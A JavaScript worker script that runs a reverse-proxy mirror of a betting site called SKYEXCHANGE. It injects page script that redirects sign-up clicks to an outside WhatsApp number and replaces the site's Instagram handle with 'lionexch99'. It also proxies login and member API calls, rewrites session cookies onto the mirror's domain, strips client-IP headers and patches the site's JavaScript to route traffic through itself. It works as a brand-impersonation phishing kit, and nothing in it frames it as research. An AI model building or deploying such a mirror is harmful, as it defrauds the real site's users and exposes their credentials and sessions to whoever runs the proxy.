const WHATSAPP_URL =
  'https://api.whatsapp.com/send/?phone=123456789&text&type=phone_number&app_absent=0';
const INSTAGRAM_NAME = 'lionexch99';
const INSTAGRAM_URL = 'https://www.instagram.com/lionexch99';

const STATIC_PORTAL_HTML = `<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover, user-scalable=no, orientation=portrait"
    />
    <meta http-equiv="Pragma" content="no-cache" />
    <meta http-equiv="Cache-control" content="no-cache" />
    <meta name="format-detection" content="telephone=no" />

    <link rel="icon" href="data:," />
    <link rel="preconnect" href="http://sc.detecas.com/" />
    <link rel="preconnect" href="https://ws-cdn001.akamaized.net" crossorigin />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />

    <title>SKYEXCHANGE</title>

    <script type="module" crossorigin src="/assets/4.44.2-index.BpV94l6u.js"></script>
    <link rel="modulepreload" crossorigin href="/assets/4.44.2-dayjs.DMj6CbCj.js">
    <link rel="modulepreload" crossorigin href="/assets/4.44.2-es-errors.D2PsFfZR.js">
    <link rel="modulepreload" crossorigin href="/assets/4.44.2-vendor.C6LoUK4V.js">
    <link rel="modulepreload" crossorigin href="/assets/4.44.2-vue-i18n.BklLzJ6z.js">
    <link rel="modulepreload" crossorigin href="/assets/4.44.2-decimal.CuriXDXX.js">
    <link rel="modulepreload" crossorigin href="/assets/4.44.2-sentry.DBFJ6vZ3.js">
    <link rel="modulepreload" crossorigin href="/assets/4.44.2-zod.B3FN7SE9.js">
    <link rel="stylesheet" crossorigin href="/assets/4.44.2-index.Bfqx2g6s.css">

    <!-- INJECTED OVERRIDES FOR WHATSAPP SIGN UP & INSTAGRAM LIONEXCH99 -->
    <style>
      .icon-support-instagram + span,
      .icon-support-instagram ~ span,
      [class*="icon-support-instagram"] + span,
      [class*="icon-support-instagram"] ~ span {
        font-size: 0 !important;
        display: inline-block !important;
      }
      .icon-support-instagram + span::after,
      .icon-support-instagram ~ span::after,
      [class*="icon-support-instagram"] + span::after,
      [class*="icon-support-instagram"] ~ span::after {
        content: "${INSTAGRAM_NAME}" !important;
        font-size: 13px !important;
        visibility: visible !important;
        display: inline-block !important;
      }
    </style>
    <script>
      (function() {
        const WA_LINK = ${JSON.stringify(WHATSAPP_URL)};
        const IG_LINK = ${JSON.stringify(INSTAGRAM_URL)};
        const IG_NAME = ${JSON.stringify(INSTAGRAM_NAME)};

        if (!window.location.hash || window.location.hash === '#/' || window.location.hash === '#') {
          window.location.hash = '#/gameHall';
        }

        function fixCaptchaImages() {
          document.querySelectorAll('img').forEach(function(img) {
            if (img.src && (img.src.includes('queryValidationCode') || img.alt === 'verify code')) {
              if (img.src.includes('saapipl.')) {
                img.src = img.src.replace(/https?:\\/\\/saapipl\\.[^\\/]+/, window.location.origin);
              }
            }
          });
        }

        document.addEventListener('click', function(e) {
          const el = e.target.closest('button, a, div, span, li, img');
          if (!el) return;

          if (el.tagName === 'IMG' && (el.src.includes('queryValidationCode') || el.alt === 'verify code')) {
            setTimeout(fixCaptchaImages, 100);
            setTimeout(fixCaptchaImages, 300);
          }

          const text = (el.innerText || el.textContent || '').trim().toLowerCase();

          if (text === 'sign up' || text === 'signup' || text === 'register' || text.includes('get online id')) {
            e.preventDefault();
            e.stopPropagation();
            window.open(WA_LINK, '_blank', 'noopener,noreferrer');
            return false;
          }

          if (text.includes('skyexchindia') || text.includes(IG_NAME) || el.classList.contains('icon-support-instagram') || el.querySelector('.icon-support-instagram')) {
            e.preventDefault();
            e.stopPropagation();
            window.open(IG_LINK, '_blank', 'noopener,noreferrer');
            return false;
          }
        }, true);

        setInterval(function() {
          fixCaptchaImages();
          document.querySelectorAll('span, div, p, a').forEach(function(node) {
            if (node.children.length === 0 && node.textContent && node.textContent.includes('skyexchindia')) {
              node.textContent = node.textContent.replace(/skyexchindia/g, IG_NAME);
            }
          });
        }, 250);
      })();
    </script>
  </head>
  <body>
    <div id="app"></div>
  </body>
</html>`;

export default {
  async fetch(request) {
    const url = new URL(request.url);

    // 1. Root & HTML
    if (
      url.pathname === '/' ||
      url.pathname === '/index.html' ||
      url.pathname === '/portal'
    ) {
      return new Response(STATIC_PORTAL_HTML, {
        headers: {
          'content-type': 'text/html;charset=UTF-8',
          'cache-control': 'public, max-age=0, must-revalidate',
          'access-control-allow-origin': '*',
        },
      });
    }

    // 2. API & Asset Routing
    const isApi =
      url.pathname.startsWith('/verify') ||
      url.pathname.startsWith('/exchange') ||
      url.pathname.startsWith('/login') ||
      url.pathname.startsWith('/member') ||
      url.pathname.startsWith('/playerService');

    const targetHost = isApi ? 'saapipl.skyexch.art' : 'www.skyexch.art';
    const targetUrl = new URL(url.pathname + url.search, `https://${targetHost}`);

    const headers = new Headers(request.headers);
    headers.set('host', targetHost);
    headers.set(
      'user-agent',
      request.headers.get('user-agent') ||
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
    );
    headers.delete('cf-connecting-ip');
    headers.delete('cf-ray');
    headers.delete('cf-visitor');
    headers.delete('x-forwarded-for');
    headers.delete('x-real-ip');

    if (isApi) {
      headers.set('origin', 'https://www.skyexch.art');
      headers.set('referer', 'https://www.skyexch.art/');
    } else {
      headers.delete('origin');
      headers.delete('referer');
    }

    const fetchOptions = {
      method: request.method,
      headers: headers,
      redirect: 'follow',
    };

    if (request.method !== 'GET' && request.method !== 'HEAD') {
      fetchOptions.body = request.body;
    }

    const response = await fetch(targetUrl, fetchOptions);

    // If JS asset, patch saapipl dynamically
    if (url.pathname.includes('/assets/') && url.pathname.endsWith('.js')) {
      let js = await response.text();
      js = js.replace(
        /window\.location\.host\.replace\(\/\^\[\^\.\]\*\/\s*,\s*["']saapipl["']\)/g,
        'window.location.host'
      );
      js = js.replace(/\.replace\(\/\^\[\^\.\]\*\/\s*,\s*["']saapipl["']\)/g, '');
      const respHeaders = new Headers(response.headers);
      respHeaders.set('content-type', 'application/javascript;charset=UTF-8');
      respHeaders.set('access-control-allow-origin', '*');
      return new Response(js, {
        status: response.status,
        headers: respHeaders,
      });
    }

    const respHeaders = new Headers(response.headers);
    respHeaders.set(
      'access-control-allow-origin',
      request.headers.get('origin') || '*'
    );
    respHeaders.set('access-control-allow-credentials', 'true');

    const setCookies = response.headers.getSetCookie
      ? response.headers.getSetCookie()
      : [];
    if (setCookies.length > 0) {
      respHeaders.delete('set-cookie');
      for (const c of setCookies) {
        respHeaders.append(
          'set-cookie',
          c
            .replace(/Domain=[^;]+;?\s*/gi, '')
            .replace(/SameSite=[^;]+;?\s*/gi, 'SameSite=Lax; ')
        );
      }
    }

    return new Response(response.body, {
      status: response.status,
      headers: respHeaders,
    });
  },
};
